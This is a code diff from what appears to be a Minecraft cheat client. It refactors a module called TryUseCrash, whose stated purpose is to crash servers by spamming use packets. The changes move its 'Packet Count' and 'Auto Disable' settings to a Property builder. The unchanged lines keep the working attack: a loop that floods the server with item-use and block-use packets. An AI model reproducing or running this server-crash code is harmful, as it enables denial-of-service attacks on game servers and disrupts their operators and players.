@@ -9,7 +9,7 @@ import me.dustin.jex.event.filters.TickFilter;
 import me.dustin.jex.event.misc.EventTick;
 import me.dustin.jex.event.player.EventPlayerPackets;
 import me.dustin.jex.feature.mod.core.Feature;
-import me.dustin.jex.feature.option.annotate.Op;
+import me.dustin.jex.feature.property.Property;
 import me.dustin.jex.helper.misc.Wrapper;
 import me.dustin.jex.helper.network.NetworkHelper;
 import net.minecraft.client.network.PendingUpdateManager;
@@ -20,14 +20,19 @@ import net.minecraft.util.hit.BlockHitResult;
 import net.minecraft.util.math.Direction;
 import net.minecraft.util.math.Vec3d;
 
-import java.util.Random;
-
 public class TryUseCrash extends Feature {
 
-    @Op(name = "Packet Count", min = 1, max = 100, inc = 10)
-    public int packetCount = 38;
-    @Op(name = "Auto Disable")
-    public boolean autoDisable = true;
+    public Property<Integer> packetCountProperty = new Property.PropertyBuilder<Integer>(this.getClass())
+            .name("Packet Count")
+            .value(38)
+            .min(1)
+            .max(100)
+            .inc(10)
+            .build();
+    public final Property<Boolean> autoDisableProperty = new Property.PropertyBuilder<Boolean>(this.getClass())
+            .name("Auto Disable")
+            .value(true)
+            .build();
 
     public TryUseCrash() {
         super(CrashPlugin.CRASH, "Tries to crash the server by spamming use packets. (By 0x150)");
@@ -40,7 +45,7 @@ public class TryUseCrash extends Feature {
         net.minecraft.network.packet.c2s.play.PlayerInteractItemC2SPacket packet = new PlayerInteractItemC2SPacket(Hand.MAIN_HAND, pendingUpdateManager.incrementSequence().getSequence());
         PlayerInteractBlockC2SPacket packet1 = new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, bhr, pendingUpdateManager.incrementSequence().getSequence());
 
-        for (int i = 0; i < packetCount; i++) {
+        for (int i = 0; i < packetCountProperty.value(); i++) {
             NetworkHelper.INSTANCE.sendPacket(packet);
             NetworkHelper.INSTANCE.sendPacket(packet1);
         }
@@ -48,7 +53,7 @@ public class TryUseCrash extends Feature {
 
     @EventPointer
     private final EventListener<EventTick> eventTickEventListener = new EventListener<>(eventTick -> {
-        if (Wrapper.INSTANCE.getWorld() == null || Wrapper.INSTANCE.getLocalPlayer() == null && autoDisable)
+        if (Wrapper.INSTANCE.getWorld() == null || Wrapper.INSTANCE.getLocalPlayer() == null && autoDisableProperty.value())
             setState(false);
     }, new TickFilter(EventTick.Mode.PRE));
 }
